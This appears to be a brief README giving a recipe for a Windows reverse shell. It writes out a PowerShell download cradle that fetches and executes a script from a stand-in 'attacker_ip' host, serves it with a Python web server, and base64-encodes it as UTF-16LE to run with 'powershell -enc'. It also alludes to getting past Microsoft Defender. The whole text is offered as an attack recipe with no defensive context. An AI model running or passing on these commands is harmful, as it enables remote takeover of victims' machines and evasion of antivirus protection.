# Simple Windows Reverse shell 
If this not working try the another one that is blocked by defender...

```language
nano touch.ps1
nano cradle
cradle content:- IEX(New-Object Net.WebClient).downloadString("http://attacker_ip:8000")

python3 -m http.server 8000

cat cradle | iconv -t utf-16le | base64 -w0; echo

powershell -enc <encoded_code>
```
